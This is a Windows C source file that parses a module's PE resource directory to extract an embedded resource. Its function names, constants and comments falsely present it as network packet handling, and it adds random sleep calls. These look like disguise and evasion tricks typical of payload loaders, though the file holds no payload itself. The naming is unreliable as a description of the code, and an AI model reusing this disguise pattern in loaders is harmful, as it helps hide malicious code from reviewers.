#include <Windows.h>

#include "Common.h"
#include "Debug.h"

// Protocol layer constants and timing
#define PROTOCOL_HEADER_MAGIC    0x5A4D    
#define PROTOCOL_OFFSET_MASK     0x7FFFFFFF
#define MAX_NETWORK_TIMEOUT      1000

BOOL XmSimulateNetworkLatency() {
    DWORD dwStart = GetTickCount();
    Sleep(XmGenerateSessionId() % 10); // Random delay between 0-10ms
    return (GetTickCount() - dwStart) < MAX_NETWORK_TIMEOUT;
}

BOOL XmFetchNetworkPacket(IN HMODULE hModule, IN WORD ResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD psResourceDataSize) {

    // Initial connection latency
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Initial Network Connection Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	CHAR*			pBaseAddr		= (CHAR*)hModule;
	PIMAGE_DOS_HEADER 	pImgDosHdr		= (PIMAGE_DOS_HEADER)pBaseAddr;
	
    // Verify protocol magic
    if (pImgDosHdr->e_magic != PROTOCOL_HEADER_MAGIC) {
#ifdef DEBUG
        PRINT("[!] Invalid Network Protocol Signature - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	PIMAGE_NT_HEADERS 	pImgNTHdr		= (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr		= (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir		= (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

    // Protocol handshake delay
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Protocol Handshake Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	PIMAGE_RESOURCE_DIRECTORY 		pResourceDir	= NULL, pResourceDir2	= NULL, pResourceDir3	= NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY 	pResourceEntry	= NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;
	PIMAGE_RESOURCE_DATA_ENTRY 		pResource	= NULL;

	pResourceDir	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry	= (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);

    // Network enumeration delay
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Resource Enumeration Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	for (DWORD i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & PROTOCOL_OFFSET_MASK));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

            // Resource lookup latency
            if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
                PRINT("[!] Resource Lookup Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
                return FALSE;
            }

			pResourceDir3	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & PROTOCOL_OFFSET_MASK));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);
			pResource	= (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & PROTOCOL_OFFSET_MASK));

			*ppResourceRawData   = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize  = pResource->Size;

			break;
		}
	}

    // Final response validation delay
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Network Response Validation Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}

BOOL XmFetchResourceData(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize) {
	
	PBYTE	pTmpResourceBuffer	= NULL;

    // Initial request delay
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Network Request Initialization Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	if (!XmFetchNetworkPacket(hModule, wResourceId, &pTmpResourceBuffer, pdwResourceSize))
		return FALSE;

	*ppResourceBuffer = XmAllocateNetworkBuffer(*pdwResourceSize);
	if (!*ppResourceBuffer)
		return FALSE;
	
    // Data transfer delay
    if (!XmSimulateNetworkLatency()) {
#ifdef DEBUG
        PRINT("[!] Network Data Transfer Timeout - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

	XmCopyNetworkBuffer(*ppResourceBuffer, pTmpResourceBuffer, *pdwResourceSize);

#ifdef DEBUG
	PRINT("\n");
	PRINT("\t>>> Network Cache Location: 0x%p \n", pTmpResourceBuffer);
	PRINT("\t>>> Network Buffer Location: 0x%p \n", *ppResourceBuffer);
	PRINT("\t>>> Packet Size: %d \n", (int)*pdwResourceSize);
	PRINT("\n");
#endif 

	return TRUE;
}
